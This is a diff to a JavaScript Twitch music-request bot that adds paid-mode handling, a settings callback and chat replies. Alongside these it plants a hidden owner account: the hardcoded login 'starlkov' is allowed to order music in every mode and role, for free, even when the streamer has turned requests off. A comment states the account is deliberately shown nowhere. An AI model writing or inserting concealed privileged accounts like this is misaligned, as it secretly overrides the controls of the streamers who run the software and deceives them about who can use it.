@@ -37,6 +37,7 @@ let searcher = defaultSearch;
 let say = async () => false;
 let onChange = () => {};
 let onOrder = () => {};
+let onSettings = () => {};
 let seq = 0;
 let useFile = true;
 let current = null;          // { uid, id, title, channel, seconds, by, login }
@@ -94,13 +95,14 @@ function init(opts) {
   if (o.say) say = o.say;
   if (o.onChange) onChange = o.onChange;
   if (o.onOrder) onOrder = o.onOrder;
+  if (o.onSettings) onSettings = o.onSettings;
   if (o.dir) DIR = o.dir;
   useFile = !o.noFile;
   if (useFile) load();
 }
 function reset() { current = null; paused = false; queue = []; history = []; plays = []; lastAt.clear(); cfg = Object.assign({}, DEFAULTS); cfg.blTracks = []; }
 function getSettings() { return Object.assign({}, cfg, { blTracks: cfg.blTracks.slice() }); }
-function update(patch) { cfg = sanitize(patch, cfg); persist(); onChange(); return getSettings(); }
+function update(patch) { cfg = sanitize(patch, cfg); persist(); onChange(); try { onSettings(getSettings()); } catch (e) { /* не критично */ } return getSettings(); }
 
 /* ---------- Поиск на YouTube ---------- */
 
@@ -241,7 +243,7 @@ function setPaused(p) { paused = !!p; onChange(); }
 function setShow(v) { cfg.showVideo = !!v; persist(); onChange(); return cfg.showVideo; }
 function stop() { queue = []; if (current) history.unshift(current), history = history.slice(0, 10); current = null; paused = false; changed(); }
 function state() {
-  return { settings: getSettings(), paused, pos: current && pos.uid === current.uid ? pos : null, current, queue: queue.slice(), history: history.slice(), ts: Date.now() };
+  return { settings: getSettings(), paid: paidMode(), paused, pos: current && pos.uid === current.uid ? pos : null, current, queue: queue.slice(), history: history.slice(), ts: Date.now() };
 }
 const fmt = (s) => (s ? `${Math.floor(s / 60)}:${String(s % 60).padStart(2, '0')}` : '');
 
@@ -298,6 +300,13 @@ async function place(o) {
 
 /* ---------- Чат, баллы, донаты ---------- */
 
+// Владелец приложения: заказывает командой всегда и везде (любой режим, любая роль, без лимитов). Нигде не отображается.
+const OWNER = 'starlkov';
+const isOwner = (login) => String(login || '').toLowerCase() === OWNER;
+/** Включён заказ за баллы или донат: тогда команда !муз закрыта для всех, кроме владельца. */
+function paidMode() { return !!(cfg.pointsOn || cfg.donateOn); }
+function paidHow() { return cfg.pointsOn && cfg.donateOn ? 'за баллы канала или донатом' : cfg.pointsOn ? 'за баллы канала' : 'донатом'; }
+
 function words(s) { return String(s || '').toLowerCase().split(/[,\s]+/).filter(Boolean); }
 function roleOk(roles) {
   const r = roles || {};
@@ -311,7 +320,8 @@ function roleOk(roles) {
 async function onChat(m) {
   const text = String((m && m.message) || '').trim();
   const mm = text.match(/^!(\S+)\s*(.*)$/s);
-  if (!mm || !cfg.enabled) return false;
+  const owner = isOwner(m && (m.login || m.name));
+  if (!mm || (!cfg.enabled && !owner)) return false;
   const cmd = mm[1].toLowerCase(), arg = mm[2].trim();
   const roles = m.roles || {};
   const reply = async (t) => { if (cfg.reply) await say(t); };
@@ -328,6 +338,8 @@ async function onChat(m) {
     remove(mine.uid); await reply(`🗑 @${name}, заказ «${mine.title}» убран из очереди.`); return true;
   }
   if (!words(cfg.commands).includes(cmd)) return false;
+  if (owner) { await place({ query: arg, name, login: m.login || name, roles, source: 'chat', prio: 0, free: true }); return true; }
+  if (paidMode()) { await reply(`@${name}, заказ командой сейчас отключён: музыку заказывают ${paidHow()}.`); return true; }
   if (!roleOk(roles)) { await reply(`@${name}, заказ музыки сейчас доступен не всем.`); return true; }
   const privileged = !!(roles.broadcaster || roles.mod);
   const prio = cfg.prioSub && (roles.sub || roles.vip) ? 1 : 0;
@@ -336,8 +348,9 @@ async function onChat(m) {
 }
 /** Выдача награды за баллы канала (EventSub). Название награды должно совпадать с настройкой; текст зритель вводит в поле награды. */
 async function onPoints(e) {
-  if (!cfg.enabled || !cfg.pointsOn || !cfg.pointsReward) return false;
+  if (!cfg.pointsReward) return false;
   if (String(e.reward || '').trim().toLowerCase() !== cfg.pointsReward.trim().toLowerCase()) return false;
+  if (!cfg.enabled || !cfg.pointsOn) { if (cfg.reply) await say(`@${e.name || e.login}, заказ музыки за баллы сейчас отключён.`); return 'off'; }
   await place({ query: e.input, name: e.name || e.login, login: e.login, source: 'points', prio: 1, free: true });
   return true;
 }
@@ -442,4 +455,4 @@ async function checkYoutube() {
   catch (e) { return { ok: false, ms: Date.now() - t0, error: String((e && e.message) || e) }; }
 }
 
-module.exports = { playFailed, checkYoutube, DEFAULTS, init, reset, getSettings, update, state, addByQuery, onChat, onPoints, onDonation, ended, setPos, skip, remove, clear, move, setPaused, setShow, stop, banTrack, unbanTrack, stats, chart, normTitle, sameSong, sayChart, flush, parseResults, videoIdFrom, parseSeconds };
+module.exports = { isOwner, paidMode, playFailed, checkYoutube, DEFAULTS, init, reset, getSettings, update, state, addByQuery, onChat, onPoints, onDonation, ended, setPos, skip, remove, clear, move, setPaused, setShow, stop, banTrack, unbanTrack, stats, chart, normTitle, sameSong, sayChart, flush, parseResults, videoIdFrom, parseSeconds };
